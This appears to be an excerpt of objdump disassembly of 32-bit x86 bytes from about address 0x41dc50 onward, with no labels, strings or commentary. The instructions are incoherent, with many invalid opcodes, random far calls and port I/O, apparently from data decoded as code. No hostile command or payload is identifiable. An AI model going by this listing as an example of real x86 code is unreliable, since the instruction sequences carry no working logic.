  41dc50:	ficomp DWORD PTR [ecx+0x49]
  41dc53:	inc    esi
  41dc54:	add    esp,DWORD PTR [edi]
  41dc56:	adc    BYTE PTR [ebp-0xc83bbeb],ah
  41dc5c:	mov    ds:0xa1d6efdd,eax
  41dc61:	pop    edx
  41dc62:	mov    esi,0xcd1c546c
  41dc67:	mov    es,ebp
  41dc69:	lds    edi,FWORD PTR [eax]
  41dc6b:	mov    ebp,DWORD PTR [eax+eax*1]
	...
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi+0x28b0d050]
  41dce3:	cmp    BYTE PTR [eax+0x13ffee2],dl
  41dce9:	add    bh,bh
  41dceb:	add    BYTE PTR [eax],al
  41dced:	add    BYTE PTR [esi-0x19e9e1a9],cl
  41dcf3:	push   ebp
  41dcf4:	nop
  41dcf5:	nop
  41dcf6:	lahf   
  41dcf7:	cwde   
  41dcf8:	pop    ebp
  41dcf9:	int3   
  41dcfa:	shr    BYTE PTR [ebp-0x24],0x64
  41dcfe:	outs   dx,DWORD PTR ds:[esi]
  41dcff:	sti    
  41dd00:	xor    eax,0xb774e28c
  41dd05:	jg     0x41dd83
  41dd07:	xor    BYTE PTR [eax],bh
  41dd09:	mov    bl,0x66
  41dd0b:	out    0x8d,al
  41dd0d:	mov    esp,0x4614726d
  41dd12:	xchg   esi,eax
  41dd13:	in     eax,dx
  41dd14:	lea    esi,[esi-0x2720c090]
  41dd1a:	enter  0x5a6e,0xcc
  41dd1e:	dec    esp
  41dd1f:	jp     0x41dd1c
  41dd21:	call   0xfa00:0xc7b8ee3b
  41dd28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd29:	inc    ecx
  41dd2a:	xchg   ebp,eax
  41dd2b:	inc    esi
  41dd2c:	xchg   DWORD PTR [edx+0x6d],edi
  41dd2f:	loope  0x41dd6d
  41dd31:	cmp    al,0x99
  41dd33:	and    DWORD PTR ds:0x8501fc44,esp
  41dd39:	push   esi
  41dd3a:	(bad)  
  41dd3b:	dec    DWORD PTR [esi+0xc]
  41dd3e:	stos   DWORD PTR es:[edi],eax
  41dd3f:	jo     0x41dd48
  41dd41:	pop    ebp
  41dd42:	fbld   TBYTE PTR [esi]
  41dd44:	neg    ecx
  41dd46:	retf   0xbae
  41dd49:	sbb    esp,0xd94b9129
  41dd4f:	fbld   TBYTE PTR ds:0xce543061
  41dd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd56:	mov    edx,0xbb816f86
  41dd5b:	sub    ebx,edx
  41dd5d:	sub    BYTE PTR [edi],ah
  41dd5f:	inc    eax
  41dd60:	scas   eax,DWORD PTR es:[edi]
  41dd61:	sbb    ah,BYTE PTR [ebp+edx*4-0x6d72519c]
  41dd68:	xor    DWORD PTR [ebp+0x844e681],edx
  41dd6e:	js     0x41ddb7
  41dd70:	call   0xc93c:0x6bfc6b3d
  41dd77:	(bad)
  41dd7a:	sub    al,0x7
  41dd7c:	fs (bad) 
  41dd7e:	scas   al,BYTE PTR es:[edi]
  41dd7f:	rcr    dl,0xb3
  41dd82:	inc    esi
  41dd83:	xchg   dl,ch
  41dd85:	inc    edx
  41dd86:	or     al,0xae
  41dd88:	mov    esp,0xb6da7cc5
  41dd8d:	add    DWORD PTR [edx],ecx
  41dd8f:	jns    0x41de03
  41dd91:	or     al,0xf4
  41dd93:	lods   eax,DWORD PTR ds:[esi]
  41dd94:	(bad)  
  41dd95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd96:	jae    0x41dd6a
  41dd98:	xchg   ecx,eax
  41dd99:	out    dx,al
  41dd9a:	xchg   esi,eax
  41dd9b:	push   ebx
  41dd9c:	mov    bl,0x36
  41dd9e:	mov    bh,0x13
  41dda0:	lahf   
  41dda1:	adc    esp,DWORD PTR [ecx+ecx*4-0x14]
  41dda5:	lods   al,BYTE PTR ds:[esi]
  41dda6:	inc    ebp
  41dda7:	add    bh,BYTE PTR [edi+ebp*8-0x29dc2855]
  41ddae:	sub    DWORD PTR [esi-0x3e],ebp
  41ddb1:	lods   al,BYTE PTR ss:[esi]
  41ddb3:	imul   ebx,DWORD PTR [ecx+edi*4],0xffffff8a
  41ddb7:	xchg   BYTE PTR [edx],cl
  41ddb9:	outs   dx,DWORD PTR ds:[esi]
  41ddba:	pop    ebp
  41ddbb:	cmp    esi,DWORD PTR [edi+0x5aba8c5]
  41ddc1:	ins    DWORD PTR es:[edi],dx
  41ddc2:	js     0x41dd8d
  41ddc4:	xchg   ecx,eax
  41ddc5:	movlps QWORD PTR ds:0x61fb8a72,xmm4
  41ddcc:	pop    ecx
  41ddcd:	sub    al,0x67
  41ddcf:	les    ecx,FWORD PTR [ebx+0x4b]
  41ddd2:	xchg   esp,eax
  41ddd3:	sub    ch,cl
  41ddd5:	xchg   esp,eax
  41ddd6:	sub    ecx,DWORD PTR [ebx+0x38]
  41ddd9:	mov    WORD PTR [esi+0x4a],fs
  41dddc:	std    
  41dddd:	mov    bl,0xb2
  41dddf:	and    DWORD PTR [ebx-0x5e],edx
  41dde2:	popa   
  41dde3:	cli    
  41dde4:	jmp    0xaa13:0x10ab0e35
  41ddeb:	call   0x41dea5
	...
  41de54:	add    BYTE PTR [eax],al
  41de56:	and    bl,dh
  41de58:	das    
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	call   0xfdb6accb
  41de67:	inc    eax
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	inc    DWORD PTR [eax]
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	add    al,0xe7
  41de70:	jb     0x41de1f
  41de72:	pop    ds
  41de73:	imul   bp,WORD PTR [ebp-0x56],0x56ed
  41de79:	loop   0x41de07
  41de7b:	push   ds
  41de7c:	xchg   ebp,eax
  41de7d:	scas   eax,DWORD PTR es:[edi]
  41de7e:	aaa    
  41de7f:	add    al,0x88
  41de81:	mov    dh,ch
  41de83:	pop    ss
  41de84:	leave  
  41de85:	sbb    bl,BYTE PTR [esi-0xf]
  41de88:	dec    eax
  41de89:	movsx  esi,cl
  41de8c:	in     eax,dx
  41de8d:	call   0xc1402234
  41de92:	mov    ch,ch
  41de94:	std    
  41de95:	xor    cl,BYTE PTR [esi+0x78c26da3]
  41de9b:	nop
  41de9c:	enter  0x6a8f,0x97
  41dea0:	rol    DWORD PTR [esi+0x14],1
  41dea3:	xchg   ebx,eax
  41dea4:	mov    dh,0xf4
  41dea6:	mov    ch,BYTE PTR [esi-0x64]
  41dea9:	push   ebx
  41deaa:	sbb    dh,ch
  41deac:	rcl    BYTE PTR [ecx+0x434f6deb],0xc1
  41deb3:	jae    0x41df13
  41deb5:	shld   edx,edx,0xe2
  41deb9:	dec    ebp
  41deba:	test   BYTE PTR [edi],0xee
  41debd:	mov    ebx,0x7d6dbe13
  41dec2:	scas   al,BYTE PTR es:[edi]
  41dec3:	mov    dl,0x47
  41dec5:	xlat   BYTE PTR ds:[ebx]
  41dec6:	sbb    BYTE PTR [ecx],al
  41dec8:	or     ecx,edx
  41deca:	and    eax,0x784cd2f4
  41decf:	into   
  41ded0:	or     edx,DWORD PTR [edi]
  41ded2:	jnp    0x41de8f
  41ded4:	out    dx,eax
  41ded5:	mov    ebp,0x3e576c39
  41deda:	rcl    BYTE PTR [esi],1
  41dedc:	mov    dl,0x30
  41dede:	in     al,dx
  41dedf:	jo     0x41dedc
  41dee1:	push   DWORD PTR [edx-0x37711e83]
  41dee7:	les    ebx,FWORD PTR [bx+di+0x33ab]
  41deec:	ds mov ch,0x32
  41deef:	fs jecxz 0x41def8
  41def2:	bound  edi,QWORD PTR [ebp+0x322b1c56]
  41def8:	and    eax,0x490ec73f
  41defd:	stc    
  41defe:	aam    0xe8
  41df00:	dec    esi
  41df01:	adc    ch,BYTE PTR [esi+0x678b4044]
  41df07:	mov    ?,WORD PTR [edx+0x63]
  41df0a:	jl     0x41df08
  41df0c:	test   eax,0xd24b1302
  41df11:	sub    al,0xb9
  41df13:	sub    BYTE PTR [ebp-0x3f],ah
  41df16:	push   0xb67269c3
  41df1b:	pop    eax
  41df1c:	lock shr BYTE PTR es:[edx-0x5e4fab61],0xf6
  41df25:	xor    DWORD PTR [edi],ecx
  41df27:	jb     0x41df48
  41df29:	icebp  
  41df2a:	xchg   edx,eax
  41df2b:	test   al,0x59
  41df2d:	lods   eax,DWORD PTR ds:[esi]
  41df2e:	stos   DWORD PTR es:[edi],eax
  41df2f:	mov    eax,0xbb3c22cb
  41df34:	stos   DWORD PTR es:[edi],eax
  41df35:	push   ds
  41df36:	jo     0x41deca
  41df38:	or     dh,BYTE PTR [eax+ebp*1+0x6a]
  41df3c:	sbb    eax,DWORD PTR [ebx+0x51915be1]
  41df42:	aam    0xaa
  41df44:	icebp  
  41df45:	xor    DWORD PTR [ebx],ebp
  41df47:	xchg   ebp,eax
  41df48:	xchg   esp,eax
  41df49:	mov    al,BYTE PTR [esi+edx*2+0x6c3aba65]
  41df50:	icebp  
  41df51:	mov    esp,0x4a55614e
  41df56:	push   0xb2867571
  41df5b:	xor    BYTE PTR [ebx],0x93
  41df5e:	push   esi
  41df5f:	fbld   TBYTE PTR [edi-0x11]
  41df62:	add    DWORD PTR [edi+0x7a],0x7e
  41df66:	pop    ss
  41df67:	xlat   BYTE PTR ds:[ebx]
  41df68:	rcl    BYTE PTR [eax+0x94ed8b],1
	...
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x3bbf9ce9
  41dfe4:	sbb    BYTE PTR [edi+0x141fc],dh
  41dfea:	inc    DWORD PTR [eax]
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	shl    BYTE PTR [ebx-0x7b],cl
  41dff1:	jmp    0x41e024
  41dff3:	rol    BYTE PTR [esi-0x6ca88f28],1
  41dff9:	clc    
  41dffa:	mov    WORD PTR [edi+edx*8],ds
  41dffd:	sbb    eax,DWORD PTR [esp+eax*1+0x9]
  41e001:	cmc    
  41e002:	cmp    al,0x82
  41e004:	icebp  
  41e005:	xor    eax,0xbf0aca76
  41e00a:	test   DWORD PTR [edx+0x53],ebx
  41e00d:	inc    ebx
  41e00e:	push   0xcc7e9ce1
  41e013:	xor    al,al
  41e015:	add    eax,0x8636096
  41e01a:	int    0x9c
  41e01c:	xchg   esp,eax
  41e01d:	xchg   ebp,eax
  41e01e:	ss push ebx
  41e020:	cwde   
  41e021:	adc    BYTE PTR ds:0xf7d9749d,dh
  41e027:	xor    BYTE PTR [ecx-0x6f3d38e],0x80
  41e02e:	adc    cl,ch
  41e030:	push   ss
  41e031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e032:	xchg   DWORD PTR [edi],ebp
  41e034:	pop    esp
  41e035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e036:	loop   0x41e06c
  41e038:	ds sub al,0xcf
  41e03b:	push   ss
  41e03c:	add    al,0x5a
  41e03e:	dec    esi
  41e03f:	out    0x2c,al
  41e041:	add    eax,0x60ada13c
  41e046:	mov    al,0x45
  41e048:	jne    0x41dfde
  41e04a:	cdq    
  41e04b:	fld    DWORD PTR [edi-0x24998864]
  41e051:	sbb    eax,DWORD PTR [edx+0x28]
  41e054:	jl     0x41e084
  41e056:	aad    0xc0
  41e058:	xlat   BYTE PTR gs:[ebx]
  41e05a:	in     eax,dx
  41e05b:	fisttp QWORD PTR [edx+eiz*1+0x23]
  41e05f:	rcl    ch,0xef
  41e062:	scas   eax,DWORD PTR es:[edi]
  41e063:	sbb    al,0x96
  41e065:	ror    BYTE PTR [ebx-0x537dabfc],0x6b
  41e06c:	mov    WORD PTR [eax+0x6f],?
  41e06f:	add    dl,bl
  41e071:	fisub  DWORD PTR [eax+0x69629529]
  41e077:	lods   eax,DWORD PTR ds:[esi]
  41e078:	inc    eax
  41e079:	lods   al,BYTE PTR ds:[esi]
  41e07a:	ror    BYTE PTR [ecx-0x263ee14f],1
  41e080:	shl    edi,cl
  41e082:	adc    al,BYTE PTR [eax+ecx*8]
  41e085:	call   0x8b1325b9
  41e08a:	jle    0x41e0cf
  41e08c:	sahf   
  41e08d:	push   eax
  41e08e:	dec    ecx
  41e08f:	add    eax,0x6de5b306
  41e094:	inc    edx
  41e095:	fistp  DWORD PTR [eax+0x4bc471ce]
  41e09b:	dec    esi
  41e09c:	sbb    BYTE PTR [edx+0x42],al
  41e09f:	cmp    DWORD PTR [ebx+0x7f],0x27
  41e0a3:	in     eax,dx
  41e0a4:	pushf  
  41e0a5:	rcr    eax,1
  41e0a7:	rol    eax,1
  41e0a9:	jmp    0x2eadc663
  41e0ae:	je     0x41e07f
  41e0b0:	mov    ebp,0x702e2908
  41e0b5:	adc    bh,BYTE PTR [edi]
  41e0b7:	inc    ebp
  41e0b8:	adc    al,0x4e
  41e0ba:	gs imul eax,esp,0x1185fc4f
  41e0c1:	test   BYTE PTR [ebx],0x84
  41e0c4:	clc    
  41e0c5:	cmp    BYTE PTR [ebx+0x40e4520a],bh
  41e0cb:	mov    bl,0x69
  41e0cd:	jo     0x41e0eb
  41e0cf:	stos   DWORD PTR es:[edi],eax
  41e0d0:	xchg   ebp,eax
  41e0d1:	add    cl,BYTE PTR [edx]
  41e0d3:	jge    0x41e07a
  41e0d5:	shl    BYTE PTR [esi-0x13],1
  41e0d8:	adc    al,0x13
  41e0da:	mov    esi,DWORD PTR [eax]
  41e0dc:	pusha  
  41e0dd:	call   0x5a2f77b0
  41e0e2:	hlt    
  41e0e3:	xchg   BYTE PTR [ebx+0xf],bh
  41e0e6:	push   esi
  41e0e7:	pop    eax
  41e0e8:	mov    ds:0xdbf34eb3,eax
	...
  41e155:	add    BYTE PTR [edi+0x53],cl
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e163:	push   ds
  41e164:	dec    esp
  41e165:	jb     0x41e162
  41e167:	inc    edx
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	inc    DWORD PTR [eax]
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	leave  
  41e16f:	dec    esp
  41e170:	in     eax,dx
  41e171:	add    BYTE PTR [ebp-0x35],dl
  41e174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e175:	push   ss
  41e176:	mov    dl,0xfa
  41e178:	ds push ss
  41e17a:	ins    DWORD PTR es:[edi],dx
  41e17b:	daa    
  41e17c:	sub    BYTE PTR [edx+0x0],0xf
  41e180:	addr16 data16 std 
  41e183:	gs sahf 
  41e185:	sub    al,0xb0
  41e187:	add    BYTE PTR [edi],al
  41e189:	add    eax,0x1b575118
  41e18e:	push   0x25efb7ce
  41e193:	add    esp,DWORD PTR [esi]
  41e195:	lods   eax,DWORD PTR ds:[esi]
  41e196:	mov    ecx,0xd6827e8
  41e19b:	loop   0x41e1cb
  41e19d:	fucomp st(1)
  41e19f:	inc    esi
  41e1a0:	jge    0x41e17e
  41e1a2:	xchg   edi,eax
  41e1a3:	mov    dl,0xcf
  41e1a5:	or     al,0x96
  41e1a7:	adc    DWORD PTR [ecx-0x7d16be97],eax
  41e1ad:	xchg   ecx,eax
  41e1ae:	test   eax,0xa7d1c78c
  41e1b3:	inc    ebx
  41e1b4:	dec    edx
  41e1b5:	mov    cl,0x47
  41e1b7:	adc    al,0xe6
  41e1b9:	sub    BYTE PTR [ebp+0x3b],al
  41e1bc:	imul   BYTE PTR [edi+ecx*8]
  41e1bf:	ins    BYTE PTR es:[edi],dx
  41e1c0:	add    dl,BYTE PTR [ecx+0x75]
  41e1c3:	cmp    BYTE PTR [edi-0x38dc8d81],bh
  41e1c9:	call   0xe4f4:0xeeb27e9a
  41e1d0:	cwde   
  41e1d1:	es test dh,0x70
  41e1d5:	in     al,dx
  41e1d6:	push   ss
  41e1d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1d8:	push   0x52
  41e1da:	mov    bh,0x86
  41e1dc:	fmul   DWORD PTR [esi]
  41e1de:	test   eax,0xd2304975
  41e1e3:	mov    al,ds:0xbabfbfb
  41e1e8:	mov    edi,0xfdadbe
  41e1ed:	sar    BYTE PTR [ebp+0x5a4abbc3],1
  41e1f3:	fdivr  st,st(0)
  41e1f5:	jnp    0x41e1a0
  41e1f7:	jmp    0x41e206
  41e1f9:	loopne 0x41e244
  41e1fb:	jp     0x41e198
  41e1fd:	xor    eax,0x62aa9e0d
  41e202:	adc    eax,DWORD PTR [ecx+0x5e95bd22]
  41e208:	pop    ebx
  41e209:	push   edi
  41e20a:	in     eax,0xea
  41e20c:	les    esp,FWORD PTR [edx+0x73d27226]
  41e212:	sbb    DWORD PTR [eax-0x6f3d7e96],esi
  41e218:	outs   dx,BYTE PTR ds:[esi]
  41e219:	sbb    al,0xf4
  41e21b:	jp     0x41e1a5
  41e21d:	add    DWORD PTR [edi],edx
  41e21f:	push   esp
  41e220:	ret    
  41e221:	xor    eax,0x5932a442
  41e226:	xchg   esp,eax
  41e227:	int3   
  41e228:	js     0x41e285
  41e22a:	sar    BYTE PTR cs:[edi],1
  41e22d:	jo     0x41e290
  41e22f:	iret   
  41e230:	loop   0x41e2a2
  41e232:	inc    esi
  41e233:	mov    cs,ebp
  41e235:	rcr    DWORD PTR [edx],1
  41e237:	xor    eax,0xae959921
  41e23c:	les    ecx,FWORD PTR [ebx-0x24d2cbf0]
  41e242:	jecxz  0x41e224
  41e244:	scas   eax,DWORD PTR es:[edi]
  41e245:	mov    edi,0x8fb1c6a2
  41e24a:	xor    BYTE PTR [eax+0x5c961fba],cl
  41e250:	sub    ah,BYTE PTR [ecx]
  41e252:	add    al,0x4a
  41e254:	pop    ebx
  41e255:	dec    ecx
  41e256:	scas   al,BYTE PTR es:[edi]
  41e257:	mov    ecx,0x1771a8a
  41e25c:	retf   
  41e25d:	stc    
  41e25e:	push   ds
  41e25f:	scas   al,BYTE PTR es:[edi]
  41e260:	pop    ecx
  41e261:	fcomp  st(5)
  41e263:	jge    0x41e28b
  41e265:	or     bl,dh
  41e267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e268:	mov    bh,0x61
  41e26a:	rol    cl,cl
  41e26c:	pop    es
	...
  41e2d5:	add    BYTE PTR [ebx-0x1988fe],ch
  41e2db:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e2e1:	or     al,0x56
  41e2e3:	fwait
  41e2e4:	inc    ebx
  41e2e5:	push   0xfffffffa
  41e2e7:	inc    ebx
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	inc    DWORD PTR [eax]
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	mov    eax,0x1d75c2ee
  41e2f3:	or     dl,BYTE PTR [ecx]
  41e2f5:	push   esp
  41e2f6:	cli    
  41e2f7:	mov    eax,0xa840821
  41e2fc:	xchg   esp,esi
  41e2fe:	in     al,0xf0
  41e300:	pop    edx
  41e301:	js     0x41e2b5
  41e303:	cmp    eax,0x7aa2cb48
  41e308:	popf   
  41e309:	fstp   TBYTE PTR [edi]
  41e30b:	dec    eax
  41e30c:	imul   esp,DWORD PTR [edx-0x1c067a86],0xf713a7d0
  41e316:	popa   
  41e317:	stos   DWORD PTR es:[edi],eax
  41e318:	xor    DWORD PTR [edx],ecx
  41e31a:	dec    eax
  41e31b:	repnz cli 
  41e31d:	jmp    0xd162:0xba565d43
  41e324:	imul   eax,ebx,0xffffffe7
  41e327:	sti    
  41e328:	jge    0x41e33b
  41e32a:	cwde   
  41e32b:	and    ecx,DWORD PTR [edx*2+0x70f941f7]
  41e332:	dec    edx
  41e333:	lock leave 
  41e335:	push   es
  41e336:	out    dx,al
  41e337:	pop    ebx
  41e338:	popa   
  41e339:	fld    DWORD PTR [edx+0x11736353]
  41e33f:	popf   
  41e340:	fsubr  QWORD PTR [ebx+ebx*8-0x58bd26ea]
  41e347:	dec    ebp
  41e348:	adc    al,0xc1
  41e34b:	int3   
  41e34c:	stc    
  41e34d:	dec    esi
  41e34e:	mov    BYTE PTR ds:0x165e0b13,bh
  41e354:	ret    0x66c6
  41e357:	xchg   esp,eax
  41e358:	ja     0x41e3b4
  41e35a:	cmp    eax,0x288c359
  41e35f:	jns    0x41e372
  41e361:	fmul   DWORD PTR [edi-0x39]
  41e364:	(bad)
  41e367:	xchg   edi,eax
  41e368:	bnd jo 0x41e3af
  41e36b:	mov    ebp,DWORD PTR cs:[ecx-0x4bc9e1a3]
  41e372:	loop   0x41e32b
  41e374:	leave  
  41e375:	mov    eax,ds:0x9cb5aac
  41e37a:	dec    esi
  41e37b:	push   ecx
  41e37c:	retf   
  41e37d:	aam    0x46
  41e37f:	cmp    cl,BYTE PTR [ebp-0x25]
  41e382:	add    ecx,edx
  41e384:	xor    eax,esp
  41e386:	and    bl,BYTE PTR ds:0x58d87fe
  41e38c:	push   ebx
  41e38d:	ins    DWORD PTR es:[edi],dx
  41e38e:	push   esp
  41e38f:	dec    ebp
  41e390:	pop    ebp
  41e391:	jno    0x41e38c
  41e393:	xor    DWORD PTR [edx+ebp*8],0xffffffab
  41e397:	test   eax,0xf217e44a
  41e39c:	jno    0x41e37e
  41e39e:	jge    0x41e3c0
  41e3a0:	int    0x7f
  41e3a2:	lahf   
  41e3a3:	mov    ds:0x2a5057b6,al
  41e3a8:	ds inc eax
  41e3aa:	and    BYTE PTR [edx+0x281a6e3a],0x27
  41e3b1:	jmp    0xf991:0xc809f495
  41e3b8:	mov    ecx,0xbfa75338
  41e3bd:	imul   esi,DWORD PTR [edi-0x73],0x0
  41e3c1:	mov    edx,0xa90f6787
  41e3c6:	mov    bl,0x14
  41e3c8:	bound  ebp,QWORD PTR [ebx+0x21]
  41e3cb:	repnz or BYTE PTR [edi],cl
  41e3ce:	sub    dl,BYTE PTR [ecx]
  41e3d0:	shl    BYTE PTR [esi-0x2f00c392],0x88
  41e3d7:	aam    0x5a
  41e3d9:	sub    dh,BYTE PTR [edi-0x7d]
  41e3dc:	in     eax,dx
  41e3dd:	ret    
  41e3de:	ret    
  41e3df:	je     0x41e37d
  41e3e1:	retf   0x6118
  41e3e4:	pop    ebx
  41e3e5:	or     al,ch
  41e3e7:	cmc    
  41e3e8:	bound  eax,QWORD PTR [eax+0x938400]
	...
  41e456:	mov    DWORD PTR [edx],edx
  41e458:	ja     0x41e479
  41e45a:	(bad)  
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0xb2d14909
  41e465:	das    
  41e466:	stc    
  41e467:	inc    esp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	inc    DWORD PTR [eax]
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	mov    ah,0x91
  41e470:	int    0x9b
  41e472:	js     0x41e4cc
  41e474:	pop    eax
  41e475:	push   ss
  41e476:	dec    eax
  41e477:	adc    al,BYTE PTR [ebp+0x2c]
  41e47a:	(bad)  [ecx-0x69]
  41e47d:	and    cl,ah
  41e47f:	les    edi,FWORD PTR [edx-0x54]
  41e482:	mov    ecx,0xc0d7e330
  41e487:	addr16 in al,0xb8
  41e48a:	cdq    
  41e48b:	aas    
  41e48c:	sbb    al,0xa4
  41e48e:	scas   eax,DWORD PTR es:[edi]
  41e48f:	xchg   ecx,eax
  41e490:	jecxz  0x41e497
  41e492:	jno    0x41e480
  41e494:	and    DWORD PTR [ebp+0x7a],esi
  41e497:	inc    edx
  41e498:	xchg   dl,ah
  41e49a:	mov    ebp,0x8e930b3b
  41e49f:	pop    edx
  41e4a0:	aad    0xcd
  41e4a2:	(bad)
  41e4a6:	shr    bh,0xb3
  41e4a9:	lds    edx,FWORD PTR [esi-0x61]
  41e4ac:	pop    eax
  41e4ad:	rcr    DWORD PTR [edi],cl
  41e4af:	lahf   
  41e4b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4b1:	(bad)  
  41e4b2:	jmp    0x41e4f5
  41e4b4:	mov    eax,ds:0x77a0604e
  41e4b9:	test   BYTE PTR [esi],al
  41e4bb:	xchg   BYTE PTR [edx+ecx*1],bl
  41e4be:	mov    ah,0xc7
  41e4c0:	enter  0xc5ad,0x93
  41e4c4:	pop    esi
  41e4c5:	mov    ds:0xf7c0b1fb,al
  41e4ca:	xlat   BYTE PTR ds:[ebx]
  41e4cb:	push   ebp
  41e4cc:	inc    ebp
  41e4cd:	out    dx,al
  41e4ce:	mov    esi,0xc7321611
  41e4d3:	mov    dh,0x69
  41e4d5:	or     eax,0x39af698c
  41e4da:	cmp    al,0x9a
  41e4dc:	shl    DWORD PTR [edx+edx*8],cl
  41e4df:	jbe    0x41e4ab
  41e4e1:	sub    eax,eax
  41e4e3:	les    ebx,FWORD PTR [esi+0x66]
  41e4e6:	jg     0x41e4e5
  41e4e8:	mov    eax,0xe97e5080
  41e4ed:	mov    ebx,0xeb969b5c
  41e4f2:	pusha  
  41e4f3:	out    dx,eax
  41e4f4:	imul   eax,DWORD PTR [eax],0xfffffff1
  41e4f7:	popf   
  41e4f8:	or     al,0x6f
  41e4fa:	push   esi
  41e4fb:	dec    edi
  41e4fc:	inc    esi
  41e4fd:	call   0xd43a588d
  41e502:	push   edx
  41e503:	sub    DWORD PTR [ebx-0x4d],0xcee9b855
  41e50a:	imul   edx,ebx,0x4c
  41e50d:	push   DWORD PTR [ecx-0x5c591762]
  41e513:	dec    esi
  41e514:	dec    esp
  41e515:	jecxz  0x41e529
  41e517:	xchg   edx,eax
  41e518:	sub    eax,0x8ed90fdb
  41e51d:	(bad)  
  41e51e:	arpl   WORD PTR [ebp+0xd],di
  41e521:	dec    ebp
  41e522:	pop    edx
  41e523:	push   ss
  41e524:	push   es
  41e525:	dec    ecx
  41e526:	scas   al,BYTE PTR es:[edi]
  41e527:	js     0x41e52f
  41e529:	hlt    
  41e52a:	lock aam 0xe7
  41e52d:	fidivr WORD PTR [ebx+0x738e516c]
  41e533:	iret   
  41e534:	and    DWORD PTR [esi],0xa08a1bcb
  41e53a:	outs   dx,DWORD PTR ds:[esi]
  41e53b:	rol    BYTE PTR [esi+0x265d09d2],1
  41e541:	pop    eax
  41e542:	(bad)  
  41e543:	ins    BYTE PTR es:[edi],dx
  41e544:	push   ebx
  41e545:	aaa    
  41e546:	dec    ebx
  41e547:	sub    DWORD PTR [ebx+0x10],0x71fa45b6
  41e54e:	cdq    
  41e54f:	dec    ecx
  41e550:	iret   
  41e551:	test   al,0x5f
  41e553:	xchg   edx,eax
  41e554:	xor    eax,0xff2059f1
  41e559:	data16 mov al,ds:0x2f19ef03
  41e55f:	push   ecx
  41e560:	mov    ebp,0x8e8edab2
  41e565:	pop    edi
  41e566:	xor    BYTE PTR [ebx+0x61],dh
  41e569:	sub    al,0x3b
  41e56b:	lods   eax,DWORD PTR ds:[esi]
  41e56c:	lea    eax,[eax]
	...
  41e5d6:	and    BYTE PTR [edx-0x35],ch
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e5ef
  41e5e3:	xchg   ebx,edx
  41e5e5:	(bad)  
  41e5e7:	inc    ebp
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	inc    DWORD PTR [eax]
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	mov    dl,BYTE PTR cs:[edx+eax*8+0x36cc740b]
  41e5f6:	xchg   ebx,eax
  41e5f7:	xchg   edx,eax
  41e5f8:	jle    0x41e671
  41e5fa:	xchg   DWORD PTR [esi+0x6e],esp
  41e5fd:	jae    0x41e5e8
  41e5ff:	or     DWORD PTR [esi+0x7],ebx
  41e602:	(bad)  
  41e603:	aam    0x89
  41e605:	outs   dx,DWORD PTR ds:[esi]
  41e606:	jge    0x41e61b
  41e608:	imul   edx,DWORD PTR [ebx+0x38bbbdcb],0xffffffc5
  41e60f:	and    BYTE PTR [ebp-0x3d8f151d],ch
  41e615:	pop    ss
  41e616:	xchg   BYTE PTR [eax+eiz*1-0x6e],dl
  41e61a:	cld    
  41e61b:	add    al,BYTE PTR [ebx+0x30]
  41e61e:	fnsave [eax-0x47eafb64]
  41e624:	sbb    DWORD PTR [eax],edx
  41e626:	dec    ecx
  41e627:	loope  0x41e64f
  41e629:	or     eax,0x7c7f7f84
  41e62e:	mov    cl,0x7e
  41e630:	inc    ebp
  41e631:	rol    BYTE PTR [eax+0x6],1
  41e634:	inc    eax
  41e635:	dec    eax
  41e636:	cmp    ah,ah
  41e638:	push   ecx
  41e639:	dec    eax
  41e63a:	icebp  
  41e63b:	sub    edi,DWORD PTR [edi-0x2988ad83]
  41e641:	mov    dh,0xb3
  41e643:	jne    0x41e685
  41e645:	(bad)  
  41e646:	pop    ecx
  41e647:	xchg   esi,eax
  41e648:	mov    dl,0x7d
  41e64a:	fist   DWORD PTR [ecx+0x35ce49a3]
  41e650:	aam    0xdd
  41e652:	sub    eax,0xea7d59b3
  41e657:	pop    edi
  41e658:	sti    
  41e659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e65a:	pushf  
  41e65b:	jmp    0x41e68a
  41e65d:	jne    0x41e641
  41e65f:	(bad)  
  41e660:	clc    
  41e661:	cwde   
  41e662:	and    al,al
